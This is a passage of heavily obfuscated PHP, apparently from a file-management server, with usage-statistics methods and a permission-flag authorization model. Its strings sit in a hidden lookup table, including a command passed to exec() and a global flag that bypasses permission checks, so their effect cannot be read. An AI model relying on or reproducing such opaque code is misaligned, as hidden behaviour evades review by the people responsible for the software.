F‹¡Š–ºÖ”: $EÍ…¯öÁÊ«[$d”‡Ê‰¤‚è[396]] = 1; $F´„’™†¹ = Model($d”‡Ê‰¤‚è[765])->where($EÍ…¯öÁÊ«)->sum($d”‡Ê‰¤‚è[87]); $EÍ…¯öÁÊ«[$d”‡Ê‰¤‚è[396]] = 2; goto AÒ…ˆŸï î; AÒ…ˆŸï î: $a¸ßñÄé§¯ = Model($d”‡Ê‰¤‚è[765])->where($EÍ…¯öÁÊ«)->sum($d”‡Ê‰¤‚è[87]); $f½ñœŠ·à = array($d”‡Ê‰¤‚è[228] => $BĞŠËô¦«¬, $d”‡Ê‰¤‚è[712] => (int) $DÔÏÚéáÏá, $d”‡Ê‰¤‚è[1578] => (int) $fÁ…¹„ÉÈ©, $d”‡Ê‰¤‚è[1579] => (int) $F´„’™†¹, $d”‡Ê‰¤‚è[1580] => (int) $a¸ßñÄé§¯); return $this->insert($f½ñœŠ·à); goto c©Œİ˜ëÒ‘; DöôïÀêª‚: $fÁ…¹„ÉÈ© = Model($d”‡Ê‰¤‚è[447])->where($EÍ…¯öÁÊ«)->sum($d”‡Ê‰¤‚è[87]); $EÍ…¯öÁÊ«[$d”‡Ê‰¤‚è[395]] = 0; $DÔÏÚéáÏá = Model($d”‡Ê‰¤‚è[765])->where($EÍ…¯öÁÊ«)->sum($d”‡Ê‰¤‚è[87]); goto F‹¡Š–ºÖ”; c©Œİ˜ëÒ‘: } public function trend($A„‚Ñ’°ä, $Eí°·à¶à¥) { goto B£©ÌóÁ˜; a¤ù§Ä™µÉ: return $EàÆÀøƒ®Û; goto AÁ—¨æ‚­; E¢ó®ÇÓƒŸ: if ($A¼ÌÍ®ù‚Ï && $Eí°·à¶à¥ != $AàÆª¼Øò[1463]) { $bëÔ–Ÿª© = $A¼ÌÍ®ù‚Ï[0][$AàÆª¼Øò[228]]; $fÒó•ùóå = $this->validDate($Eí°·à¶à¥, $bëÔ–Ÿª©); $cœ¹ÅÜ¥†å = array(); $F‡Ğœ†ìóğ = array_to_keyvalue($A¼ÌÍ®ù‚Ï, $AàÆª¼Øò[228]); foreach ($fÒó•ùóå as $F’„àËˆï©) { if (isset($F‡Ğœ†ìóğ[$F’„àËˆï©])) { $b»¬›î¡×Ÿ = $F‡Ğœ†ìóğ[$F’„àËˆï©]; } else { $b»¬›î¡×Ÿ = end($A¼ÌÍ®ù‚Ï); $b»¬›î¡×Ÿ[$AàÆª¼Øò[228]] = $F’„àËˆï©; if ($A„‚Ñ’°ä == $AàÆª¼Øò[560]) { $b»¬›î¡×Ÿ[$AàÆª¼Øò[1574]] = $b»¬›î¡×Ÿ[$AàÆª¼Øò[1575]] = 0; } } $cœ¹ÅÜ¥†å[] = $b»¬›î¡×Ÿ; } $A¼ÌÍ®ù‚Ï = $cœ¹ÅÜ¥†å; } $F…×Ü°ÒÀ‹ = array($AàÆª¼Øò[560] => array($AàÆª¼Øò[714] => LNG($AàÆª¼Øò[1590]), $AàÆª¼Øò[1574] => LNG($AàÆª¼Øò[1591]), $AàÆª¼Øò[1575] => LNG($AàÆª¼Øò[1592])), $AàÆª¼Øò[1576] => array($AàÆª¼Øò[712] => LNG($AàÆª¼Øò[1593]), $AàÆª¼Øò[1578] => LNG($AàÆª¼Øò[1594]), $AàÆª¼Øò[1579] => LNG($AàÆª¼Øò[1595]), $AàÆª¼Øò[1580] => LNG($AàÆª¼Øò[1596]))); $AÄ–ÁŸÀŒ = array($AàÆª¼Øò[560] => $AàÆª¼Øò[1597], $AàÆª¼Øò[1576] => $AàÆª¼Øò[87]); goto CŞ¸„£ÌÏë; B£©ÌóÁ˜: $AàÆª¼Øò =& $_SERVER[¢Í]; if (!$this->init($A„‚Ñ’°ä)) { return !1; } $A¼ÌÍ®ù‚Ï = $this->trendList($A„‚Ñ’°ä); goto E¢ó®ÇÓƒŸ; CŞ¸„£ÌÏë: if (empty($A¼ÌÍ®ù‚Ï)) { $F’„àËˆï© = date($AàÆª¼Øò[1581], strtotime($AàÆª¼Øò[1582])); $DİÍ‘¢ø = array($AàÆª¼Øò[228] => $F’„àËˆï©); foreach ($F…×Ü°ÒÀ‹[$A„‚Ñ’°ä] as $D§Ò„‹ğ›© => $f¥ˆ¢‹èĞ) { $DİÍ‘¢ø[$D§Ò„‹ğ›©] = 0; } $A¼ÌÍ®ù‚Ï[] = $DİÍ‘¢ø; } $EàÆÀøƒ®Û = array(); foreach ($A¼ÌÍ®ù‚Ï as $f¥ˆ¢‹èĞ) { if ($A„‚Ñ’°ä == $AàÆª¼Øò[1576] && $f¥ˆ¢‹èĞ[$AàÆª¼Øò[1578]] > $f¥ˆ¢‹èĞ[$AàÆª¼Øò[712]]) { $f¥ˆ¢‹èĞ[$AàÆª¼Øò[1578]] = $f¥ˆ¢‹èĞ[$AàÆª¼Øò[712]]; } foreach ($F…×Ü°ÒÀ‹[$A„‚Ñ’°ä] as $D§Ò„‹ğ›© => $d’¬¦´×») { $b»¬›î¡×Ÿ = array($AàÆª¼Øò[228] => $f¥ˆ¢‹èĞ[$AàÆª¼Øò[228]], $AàÆª¼Øò[1394] => $d’¬¦´×»); $b»¬›î¡×Ÿ[$AÄ–ÁŸÀŒ[$A„‚Ñ’°ä]] = isset($f¥ˆ¢‹èĞ[$D§Ò„‹ğ›©]) ? $f¥ˆ¢‹èĞ[$D§Ò„‹ğ›©] : 0; $EàÆÀøƒ®Û[] = $b»¬›î¡×Ÿ; } } goto a¤ù§Ä™µÉ; AÁ—¨æ‚­: } public function validDate($A¿ÚÈğ‘, $DôÑÃ÷Ì…ß) { goto F–œù˜Ş‰; F–œù˜Ş‰: $C­Å«Ø›éˆ =& $_SERVER[¢Í]; $d››¤’å = date($C­Å«Ø›éˆ[1581], strtotime($C­Å«Ø›éˆ[1582])); $E‹œŒèƒò¦ = array($d››¤’å); goto a›ìğ’Œ”¹; a›ìğ’Œ”¹: switch ($A¿ÚÈğ‘) { case $C­Å«Ø›éˆ[1470]: $dİ¬ø•Ö‚¡ = mktime(0, 0, 0, date($C­Å«Ø›éˆ[1598]), date($C­Å«Ø›éˆ[1215]) - date($C­Å«Ø›éˆ[1277]) + 7 - 7, date($C­Å«Ø›éˆ[1599])); $e·¬„Éª»» = 0; do { $a³Â¶ğ‘à = date($C­Å«Ø›éˆ[1581], $dİ¬ø•Ö‚¡ - 3600 * 24 * 7 * $e·¬„Éª»»); $E‹œŒèƒò¦[] = $a³Â¶ğ‘à; $e·¬„Éª»»++; } while ($DôÑÃ÷Ì…ß < $a³Â¶ğ‘à); break; case $C­Å«Ø›éˆ[1468]: $e·¬„Éª»» = 1; do { $AíŞ®ò‚Â = date($C­Å«Ø›éˆ[1600], strtotime("\55\x20{$e·¬„Éª»»}\x20\x6d\x6f\x6e\x74\150\163")); $E‹œŒèƒò¦[] = $AíŞ®ò‚Â; $e·¬„Éª»»++; } while ($DôÑÃ÷Ì…ß < $AíŞ®ò‚Â); break; case $C­Å«Ø›éˆ[1601]: $F¼Àšõ³»À = (int) date($C­Å«Ø›éˆ[1599], strtotime($DôÑÃ÷Ì…ß)); $D”Ş ·¸Ğ— = (int) date($C­Å«Ø›éˆ[1599]); if ($F¼Àšõ³»À >= $D”Ş ·¸Ğ—) { break; } for ($F¼Àšõ³»À; $F¼Àšõ³»À < $D”Ş ·¸Ğ—; $F¼Àšõ³»À++) { $E‹œŒèƒò¦[] = $F¼Àšõ³»À . $C­Å«Ø›éˆ[1602]; } break; default: break; } if ($DôÑÃ÷Ì…ß > end($E‹œŒèƒò¦)) { array_pop($E‹œŒèƒò¦); } sort($E‹œŒèƒò¦); goto FÉ×¸¸«ÀÆ; FÉ×¸¸«ÀÆ: return $E‹œŒèƒò¦; goto càÉ±˜˜†ˆ; càÉ±˜˜†ˆ: } public function listTable($D¾Úæ‚¨) { $aèç¡ğª»¡ = ucfirst($D¾Úæ‚¨); return Model($aèç¡ğª»¡)->listData(); } public function option($dÅ—”¤¼Ø•) { $a›·‡ë‘… = $_SERVER[¢Í][1603] . ucfirst($dÅ—”¤¼Ø•); return $this->{$a›·‡ë‘…}(); } private function optionUser() { goto d›‹îİª°˜; d›‹îİª°˜: $Cá•ÊÜ¶¿â =& $_SERVER[¢Í]; $cÊ÷ùâÛœñ = Model($Cá•ÊÜ¶¿â[503])->count($Cá•ÊÜ¶¿â[1489]); $c³Èğ°Ò×Ş = Model($Cá•ÊÜ¶¿â[503])->where($Cá•ÊÜ¶¿â[1604])->count($Cá•ÊÜ¶¿â[1489]); goto FèªÂà„á; CÏ³ÈŞ›ˆŠ: $Aæ“‡¢Õ‘½ = Model($Cá•ÊÜ¶¿â[503])->where($bù‡‹Ù‚Ş)->count($Cá•ÊÜ¶¿â[1489]); return array($Cá•ÊÜ¶¿â[709] => (int) $cÊ÷ùâÛœñ, $Cá•ÊÜ¶¿â[1607] => (int) ($cÊ÷ùâÛœñ - $c³Èğ°Ò×Ş), $Cá•ÊÜ¶¿â[1608] => (int) $c³Èğ°Ò×Ş, $Cá•ÊÜ¶¿â[1609] => (int) $Aæ“‡¢Õ‘½, $Cá•ÊÜ¶¿â[1610] => $D‰´®Á•¬İ); goto f©ºĞÌÂÅÛ; FèªÂà„á: $a¨¶Ø¿‹ì­ = strtotime($Cá•ÊÜ¶¿â[1605]); $bù‡‹Ù‚Ş = array($Cá•ÊÜ¶¿â[1606] => array($Cá•ÊÜ¶¿â[939], $a¨¶Ø¿‹ì­)); $D‰´®Á•¬İ = (int) Model($Cá•ÊÜ¶¿â[503])->where($bù‡‹Ù‚Ş)->count($Cá•ÊÜ¶¿â[1489]); goto b´ÒœÅç†­; b´ÒœÅç†­: if (!$D‰´®Á•¬İ) { $D‰´®Á•¬İ = 1; } $a¨¶Ø¿‹ì­ = strtotime(date($Cá•ÊÜ¶¿â[1585])); $bù‡‹Ù‚Ş = array($Cá•ÊÜ¶¿â[1606] => array($Cá•ÊÜ¶¿â[939], $a¨¶Ø¿‹ì­)); goto CÏ³ÈŞ›ˆŠ; f©ºĞÌÂÅÛ: } private function optionFile() { goto FÊ«Ûé‰Ô; BÑºØ¶ºÇ‡: $e‚Å‚Ëç– = Model($E†ŠÂóÕÛ[765])->where($BÊ—°öÁ…)->sum($E†ŠÂóÕÛ[87]); $e¿œ÷á¦Í£ = Model($E†ŠÂóÕÛ[765])->where($BÊ—°öÁ…)->count($E†ŠÂóÕÛ[394]); return array($E†ŠÂóÕÛ[712] => $e†¾Úàï´°, $E†ŠÂóÕÛ[1578] => $AÄÓ¬‡‚™ö, $E†ŠÂóÕÛ[1611] => $e†¾Úàï´° - $AÄÓ¬‡‚™ö, $E†ŠÂóÕÛ[1612] => (int) $e‚Å‚Ëç–, $E†ŠÂóÕÛ[714] => (int) $Fì‹ÔË—ñ’, $E†ŠÂóÕÛ[1613] => (int) $e¿œ÷á¦Í£); goto a·¬»®¸ˆÕ; FÊ«Ûé‰Ô: $E†ŠÂóÕÛ =& $_SERVER[¢Í]; $d›šæ¦¬× = $this->sourceSize(); $e†¾Úàï´° = $d›šæ¦¬×[$E†ŠÂóÕÛ[87]]; goto dÈÊ¹ÜÁäÀ; dÈÊ¹ÜÁäÀ: $AÄÓ¬‡‚™ö = $d›šæ¦¬×[$E†ŠÂóÕÛ[1578]]; $Fì‹ÔË—ñ’ = Model($E†ŠÂóÕÛ[765])->where(array($E†ŠÂóÕÛ[395] => 0))->count($E†ŠÂóÕÛ[394]); $BÊ—°öÁ… = array($E†ŠÂóÕÛ[395] => 0, $E†ŠÂóÕÛ[200] => array($E†ŠÂóÕÛ[939], strtotime(date($E†ŠÂóÕÛ[1585])))); goto BÑºØ¶ºÇ‡; a·¬»®¸ˆÕ: } private function optionAccess() { $B¹ŞœŒ»â´ =& $_SERVER[¢Í]; return array($B¹ŞœŒ»â´[709] => $this->typeLogCnt(), $B¹ŞœŒ»â´[113] => $this->typeLogCnt($B¹ŞœŒ»â´[113]), $B¹ŞœŒ»â´[429] => $this->typeLogCnt($B¹ŞœŒ»â´[429]), $B¹ŞœŒ»â´[1614] => $this->typeLogCnt($B¹ŞœŒ»â´[1614]), $B¹ŞœŒ»â´[1615] => $this->typeLogCnt($B¹ŞœŒ»â´[1615]), $B¹ŞœŒ»â´[560] => $this->typeLogCnt($B¹ŞœŒ»â´[33], $B¹ŞœŒ»â´[1589])); } private function typeLogCnt($B¤¡àæ‰„ = '', $a­éÑò¼ì = "\151\144") { goto Cé‡¼»âß; D¼Åµà²‰: return (int) $B¾ğÚÏœ÷; goto F‰ĞèÕÂ˜Ø; Cé‡¼»âß: $bÎñÉô”‡ =& $_SERVER[¢Í]; $c¨êĞùÛçæ = array($bÎñÉô”‡[113] => array($bÎñÉô”‡[1616], $bÎñÉô”‡[1617]), $bÎñÉô”‡[429] => array($bÎñÉô”‡[1618], $bÎñÉô”‡[1619]), $bÎñÉô”‡[1614] => array($bÎñÉô”‡[1620], $bÎñÉô”‡[1621], $bÎñÉô”‡[1622]), $bÎñÉô”‡[1615] => array($bÎñÉô”‡[1623], $bÎñÉô”‡[1624]), $bÎñÉô”‡[1625] => array($bÎñÉô”‡[1626], $bÎñÉô”‡[1627], $bÎñÉô”‡[1628])); $c®Şô£ŞÙ = strtotime(date($bÎñÉô”‡[1585])); goto fÎ¹¾®ÓÄâ; fÎ¹¾®ÓÄâ: $CñçÆëØÌğ = array($bÎñÉô”‡[200] => array($bÎñÉô”‡[939], $c®Şô£ŞÙ)); if ($B¤¡àæ‰„) { $CñçÆëØÌğ[$bÎñÉô”‡[29]] = array($bÎñÉô”‡[7], $c¨êĞùÛçæ[$B¤¡àæ‰„]); } $B¾ğÚÏœ÷ = Model($bÎñÉô”‡[1588])->where($CñçÆëØÌğ)->count($a­éÑò¼ì); goto D¼Åµà²‰; F‰ĞèÕÂ˜Ø: } private function optionServer() { goto A’ß¦ìˆî†; A’ß¦ìˆî†: $C—“è°”æô =& $_SERVER[¢Í]; $F‡¸Ğ¾ƒøÑ = $this->diskDriver(); $D›ÓñÁ‰ğˆ = KodIO::defaultDriver(); goto B—­Ëç÷ŒØ; Dç”ˆÖƒ‹»: return array($C—“è°”æô[1631] => $F‡¸Ğ¾ƒøÑ ? $F‡¸Ğ¾ƒøÑ[$C—“è°”æô[1632]] : 0, $C—“è°”æô[1633] => $F‡¸Ğ¾ƒøÑ ? $F‡¸Ğ¾ƒøÑ[$C—“è°”æô[1634]] : 0, $C—“è°”æô[1635] => (int) $D›ÓñÁ‰ğˆ[$C—“è°”æô[1632]] * 1024 * 1024 * 1024, $C—“è°”æô[1636] => (int) $d´¤¥‰ù¶, $C—“è°”æô[1637] => ucfirst($B²Ó…‘‡ã«), $C—“è°”æô[1638] => $C—“è°”æô[1639] . PHP_VERSION, $C—“è°”æô[1640] => phpBuild64() ? 64 : 32, $C—“è°”æô[708] => str_replace($C—“è°”æô[1641], $C—“è°”æô[916], $F¾ìñÄº), $C—“è°”æô[352] => ucfirst($b…³ÊéÊåË), $C—“è°”æô[28] => $_SERVER[$C—“è°”æô[1642]]); goto BôªòÎÅ¦²; aëİÖˆ¬Ğ: if ($F¾ìñÄº == $C—“è°”æô[737]) { $DŞ—ÏŞ¶áâ = explode($C—“è°”æô[1129], $CõôÚ²ôªË[$C—“è°”æô[899]]); $F¾ìñÄº = $DŞ—ÏŞ¶áâ[0]; } if ($F¾ìñÄº == $C—“è°”æô[740] || $F¾ìñÄº == $C—“è°”æô[741]) { $A‡Ú¥Ú§Ã¹ = Model()->db()->query($C—“è°”æô[1629]); $dÔºîëˆé• = $A‡Ú¥Ú§Ã¹[0] && isset($A‡Ú¥Ú§Ã¹[0][$C—“è°”æô[1393]]) ? $A‡Ú¥Ú§Ã¹[0][$C—“è°”æô[1393]] : 0; $F¾ìñÄº = $C—“è°”æô[1630] . ($dÔºîëˆé• ? $C—“è°”æô[8] . $dÔºîëˆé• : $C—“è°”æô[33]); } $b…³ÊéÊåË = $GLOBALS[$C—“è°”æô[6]][$C—“è°”æô[352]][$C—“è°”æô[767]]; goto Dç”ˆÖƒ‹»; B—­Ëç÷ŒØ: $e†¹´­‚Õ = array($C—“è°”æô[757] => $D›ÓñÁ‰ğˆ[$C—“è°”æô[392]]); $d´¤¥‰ù¶ = Model($C—“è°”æô[447])->where($e†¹´­‚Õ)->sum($C—“è°”æô[87]); $aì†µ˜†®Â = explode($C—“è°”æô[50], $_SERVER[$C—“è°”æô[149]]); goto d¨Ö¡°ÎÇÓ; d¨Ö¡°ÎÇÓ: $B²Ó…‘‡ã« = $aì†µ˜†®Â[0]; $CõôÚ²ôªË = $GLOBALS[$C—“è°”æô[6]][$C—“è°”æô[17]]; $F¾ìñÄº = $CõôÚ²ôªË[$C—“è°”æô[900]]; goto aëİÖˆ¬Ğ; BôªòÎÅ¦²: } private function diskDriver() { goto DŸÆÖÜ‘ä; DŸÆÖÜ‘ä: $EÌ‡¶±Ñáƒ =& $_SERVER[¢Í]; $fê‡Ô°ÃÂ = $EÌ‡¶±Ñáƒ[8]; $CŸµŸó“Ë¢ = $GLOBALS[$EÌ‡¶±Ñáƒ[6]][$EÌ‡¶±Ñáƒ[1643]] == $EÌ‡¶±Ñáƒ[1644]; goto fò¬‡ßÆŒª; fò¬‡ßÆŒª: if ($CŸµŸó“Ë¢) { $fê‡Ô°ÃÂ = $EÌ‡¶±Ñáƒ[1645]; if (function_exists($EÌ‡¶±Ñáƒ[1646])) { exec($EÌ‡¶±Ñáƒ[1647], $Aƒîâ‘ì¦õ); $fê‡Ô°ÃÂ = $Aƒîâ‘ì¦õ[1] . $EÌ‡¶±Ñáƒ[8]; } } if (!file_exists($fê‡Ô°ÃÂ)) { return; } $EîˆöØÖ™Ï = @disk_total_space($fê‡Ô°ÃÂ); goto a¯‚õ¹Ñø; a¯‚õ¹Ñø: $eï‚ãàÔ°¦ = $EîˆöØÖ™Ï - @disk_free_space($fê‡Ô°ÃÂ); return array($EÌ‡¶±Ñáƒ[1632] => $EîˆöØÖ™Ï, $EÌ‡¶±Ñáƒ[1634] => $eï‚ãàÔ°¦); goto c’ƒóø‰×ù; c’ƒóø‰×ù: } public function fileChart($e†ñø†îŠ) { goto aÔêïÛâ®; AÎ¬›±ß³: $Eê¦áÀÊ”­ = $this->sourceSize(); $D»ÈÕÎµ» = array($cõáìé¡­à[487] => 0, $cõáìé¡­à[396] => 1); $dªâĞ¹Ó = Model($cõáìé¡­à[765])->where($D»ÈÕÎµ»)->sum($cõáìé¡­à[87]); goto cğ‰ÌÂ¬Šõ; aÔêïÛâ®: $cõáìé¡­à =& $_SERVER[¢Í]; if (isset($e†ñø†îŠ[$cõáìé¡­à[1489]])) { return Model($cõáìé¡­à[765])->userFileTypeProfile($e†ñø†îŠ[$cõáìé¡­à[1489]]); } if (isset($e†ñø†îŠ[$cõáìé¡­à[1648]])) { return Model($cõáìé¡­à[765])->groupFileTypeProfile($e†ñø†îŠ[$cõáìé¡­à[1648]]); } goto AÎ¬›±ß³; cğ‰ÌÂ¬Šõ: $D»ÈÕÎµ»[$cõáìé¡­à[396]] = 2; $CâàÚÀ¤õ— = Model($cõáìé¡­à[765])->where($D»ÈÕÎµ»)->sum($cõáìé¡­à[87]); return array($cõáìé¡­à[712] => $Eê¦áÀÊ”­[$cõáìé¡­à[87]], $cõáìé¡­à[1578] => $Eê¦áÀÊ”­[$cõáìé¡­à[1578]], $cõáìé¡­à[1579] => (int) $dªâĞ¹Ó, $cõáìé¡­à[1580] => (int) $CâàÚÀ¤õ—); goto C½ÆÄ«Ê”; C½ÆÄ«Ê”: } private function sourceSize() { $fõ¥Œ÷‰êÍ =& $_SERVER[¢Í]; $C•áÒªİÛ = Model($fõ¥Œ÷‰êÍ[765])->where(array($fõ¥Œ÷‰êÍ[395] => 0))->sum($fõ¥Œ÷‰êÍ[87]); $A¶êÎõˆ†¸ = Model($fõ¥Œ÷‰êÍ[447])->sum($fõ¥Œ÷‰êÍ[87]); if ($A¶êÎõˆ†¸ > $C•áÒªİÛ) { $A¶êÎõˆ†¸ = $C•áÒªİÛ; } return array($fõ¥Œ÷‰êÍ[87] => (int) $C•áÒªİÛ, $fõ¥Œ÷‰êÍ[1578] => (int) $A¶êÎõˆ†¸); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $EùË¥è°ˆß =& $_SERVER[¢Í]; $BéƒÙó‰¹Û = array(array($EùË¥è°ˆß[411] => LNG($EùË¥è°ˆß[1649]), $EùË¥è°ˆß[1650] => $EùË¥è°ˆß[1651], $EùË¥è°ˆß[1652] => 1, $EùË¥è°ˆß[1653] => 1, $EùË¥è°ˆß[1654] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($EùË¥è°ˆß[411] => LNG($EùË¥è°ˆß[1655]), $EùË¥è°ˆß[1650] => $EùË¥è°ˆß[1656], $EùË¥è°ˆß[1652] => 2, $EùË¥è°ˆß[1653] => 1, $EùË¥è°ˆß[1654] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($EùË¥è°ˆß[411] => LNG($EùË¥è°ˆß[1657]), $EùË¥è°ˆß[1650] => $EùË¥è°ˆß[1658], $EùË¥è°ˆß[1652] => 3, $EùË¥è°ˆß[1653] => 1, $EùË¥è°ˆß[1654] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($EùË¥è°ˆß[411] => LNG($EùË¥è°ˆß[1659]), $EùË¥è°ˆß[1650] => $EùË¥è°ˆß[1660], $EùË¥è°ˆß[1652] => 4, $EùË¥è°ˆß[1653] => 1, $EùË¥è°ˆß[1654] => self::AUTH_SHOW | self::AUTH_VIEW), array($EùË¥è°ˆß[411] => LNG($EùË¥è°ˆß[1661]), $EùË¥è°ˆß[1650] => $EùË¥è°ˆß[1662], $EùË¥è°ˆß[1652] => 5, $EùË¥è°ˆß[1653] => 1, $EùË¥è°ˆß[1654] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($EùË¥è°ˆß[411] => LNG($EùË¥è°ˆß[1663]), $EùË¥è°ˆß[1650] => $EùË¥è°ˆß[1664], $EùË¥è°ˆß[1652] => 6, $EùË¥è°ˆß[1653] => 1, $EùË¥è°ˆß[1654] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($EùË¥è°ˆß[411] => LNG($EùË¥è°ˆß[1665]), $EùË¥è°ˆß[1650] => $EùË¥è°ˆß[1666], $EùË¥è°ˆß[1652] => 7, $EùË¥è°ˆß[1653] => 1, $EùË¥è°ˆß[1654] => 0)); return $BéƒÙó‰¹Û; } public static function authCheck($Eôë¤¹Æ, $CĞÎ·‰êí¶) { $Eôë¤¹Æ = intval($Eôë¤¹Æ); if (_get($GLOBALS, $_SERVER[¢Í][483])) { return !0; } if ($Eôë¤¹Æ <= 0) { return !1; } if (($Eôë¤¹Æ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Eôë¤¹Æ & $CĞÎ·‰êí¶); } public static function authCheckShow($F¼ƒ´–˜‡¤) { return self::authCheck($F¼ƒ´–˜‡¤, self::AUTH_SHOW); } public static function authCheckView($eà©º–ø±ğ) { return self::authCheck($eà©º–ø±ğ, self::AUTH_VIEW); } public static function authCheckDownload($d©Ô¤±ÂĞ…) { return self::authCheck($d©Ô¤±ÂĞ…, self::AUTH_DOWNLOAD); } public static function authCheckUpload($d¢§·ò»ß£) { return self::authCheck($d¢§·ò»ß£, self::AUTH_UPLOAD); } public static function authCheckEdit($e²ÎÓµÏ‘) { return self::authCheck($e²ÎÓµÏ‘, self::AUTH_EDIT); } public static function authCheckRemove($FÙªÍˆæ…†) { return self::authCheck($FÙªÍˆæ…†, self::AUTH_REMOVE); } public static function authCheckShare($c ïì­÷) { return self::authCheck($c ïì­÷, self::AUTH_SHARE); } public static function authCheckComment($EàÜòÎÆ‹ì) { return self::authCheck($EàÜòÎÆ‹ì, self::AUTH_COMMENT); } public static function authCheckEvent($Cì”ã½«—¼) { return self::authCheck($Cì”ã½«—¼, self::AUTH_EVENT); } public static function authCheckRoot($a†ÑÔèÂ‰Œ) { return self::authCheck($a†ÑÔèÂ‰Œ, self::AUTH_ROOT); } public static function authCheckAction($FÓê¯Ü˜¸¿, $D®­† ×§é) { goto eïãğãÍÇğ; Dˆ†Ç»´¹¬: if (($FÓê¯Ü˜¸¿ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($FÓê¯Ü˜¸¿ & $aÔ†Ñá‘óö); goto bã‚º§ºÏ; D—Ÿ™¶´‰: $aÔ†Ñá‘óö = $cğÓî¥ğÂ½[$D®­† ×§é]; $FÓê¯Ü˜¸¿ = intval($FÓê¯Ü˜¸¿); if ($FÓê¯Ü˜¸¿ <= 0) { return !1; } goto Dˆ†Ç»´¹¬; eïãğãÍÇğ: $fŞšãæƒÉ¨ =& $_SERVER[¢Í]; $cğÓî¥ğÂ½ = array($fŞšãæƒÉ¨[1667] => self::AUTH_VIEW, $fŞšãæƒÉ¨[1061] => self::AUTH_DOWNLOAD, $fŞšãæƒÉ¨[113] => self::AUTH_UPLOAD, $fŞšãæƒÉ¨[1615] => self::AUTH_EDIT, $fŞšãæƒÉ¨[1614] => self::AUTH_REMOVE, $fŞšãæƒÉ¨[1625] => self::AUTH_SHARE, $fŞšãæƒÉ¨[357] => self::AUTH_COMMENT, $fŞšãæƒÉ¨[1478] => self::AUTH_EVENT, $fŞšãæƒÉ¨[1668] => self::AUTH_ROOT); if (!isset($cğÓî¥ğÂ½[$D®­† ×§é])) { return; } goto D—Ÿ™¶´‰; bã‚º§ºÏ: } public static function authDisable($A¦“¨ÃÉÂ…, $b‘Óª£–êï) { if (intval($A¦“¨ÃÉÂ…) <= 0) { return 0; } return intval($A¦“¨ÃÉÂ…) & ~$b‘Óª£–êï; } public $optionType = "\123\x79\x73\164\145\x6d\56\x73\157\165\162\143\145\101\x75\164\x68\x4c\151\163\x74"; public $field = array("\x6e\141\x6d\145", "\141\x75\x74\x68", "\x6c\141\x62\x65\154", "\144\x69\x73\160\154\x61\171", "\x73\171\163\x74\145\155", "\163\157\162\x74"); public function initData() { $e™‘ÒÉ‡ã» = $this->authDefault(); foreach ($e™‘ÒÉ‡ã» as $AàßëƒÄ¼º) { $this->add($AàßëƒÄ¼º); } } public function listData($dêœ×Üã‘ = false, $DŞ­Ê×ËæŠ = "\x73\157\x72\x74", $B£ØŒ©ìíÁ = false) { return parent::listData($dêœ×Üã‘, $DŞ­Ê×ËæŠ, $B£ØŒ©ìíÁ); } public function update($a²…¹ÏÄ», $E­òÈˆ£à‡) { $F’“óÕ­ =& $_SERVER[¢Í]; $fÜØÇ•ÖÂñ = parent::listData($a²…¹ÏÄ»); $e–ˆ¢øø‹­ = $this->findByName($E­òÈˆ£à‡[$F’“óÕ­[28]]); if (!$fÜØÇ•ÖÂñ || $e–ˆ¢øø‹­ && $e–ˆ¢øø‹­[$F’“óÕ­[392]] != $fÜØÇ•ÖÂñ[$F’“óÕ­[392]]) { return !1; } $this->filterAuth($E­òÈˆ£à‡[$F’“óÕ­[401]]); return parent::update($a²…¹ÏÄ», $E­òÈˆ£à‡); } public function remove($BÜ…§³§¥·) { $bØù¾šØÃ¢ = parent::listData($BÜ…§³§¥·); if (!$bØù¾šØÃ¢ || $bØù¾šØÃ¢[$_SERVER[¢Í][1133]]) { return !1; } return parent::remove($BÜ…§³§¥·); } public function add($cÎŒìšÉó = array()) { goto d«½Ñ˜±¦Š; d«½Ñ˜±¦Š: $fášŠÃİÄ„ =& $_SERVER[¢Í]; if ($this->findByName($cÎŒìšÉó[$fášŠÃİÄ„[28]])) { return !1; } $D‚­Ñå‰— = array($fášŠÃİÄ„[28] => $fášŠÃİÄ„[33], $fášŠÃİÄ„[401] => 1, $fášŠÃİÄ„[1669] => $fášŠÃİÄ„[1658], $fášŠÃİÄ„[1670] => 1, $fášŠÃİÄ„[1133] => 0, $fášŠÃİÄ„[1671] => 0); goto A²íœà¢ö°; d‘”±âÒŒë: return parent::insert($cÎŒìšÉó); goto a‘¨™ñ‡Š†; A²íœà¢ö°: $cÎŒìšÉó = array_merge($D‚­Ñå‰—, $cÎŒìšÉó); $cÎŒìšÉó[$fášŠÃİÄ„[1671]] = $this->getSort(); $this->filterAuth($cÎŒìšÉó[$fášŠÃİÄ„[401]]); goto d‘”±âÒŒë; a‘¨™ñ‡Š†: } private function getSort() { $A³Ñ·—¿¹ =& $_SERVER[¢Í]; $E’¸«ë†¿ = parent::listData(); $d¦±Ï–éÆŠ = array_to_keyvalue($E’¸«ë†¿, $A³Ñ·—¿¹[33], $A³Ñ·—¿¹[1671]); return empty($d¦±Ï–éÆŠ) ? 0 : max($d¦±Ï–éÆŠ) + 1; } private function 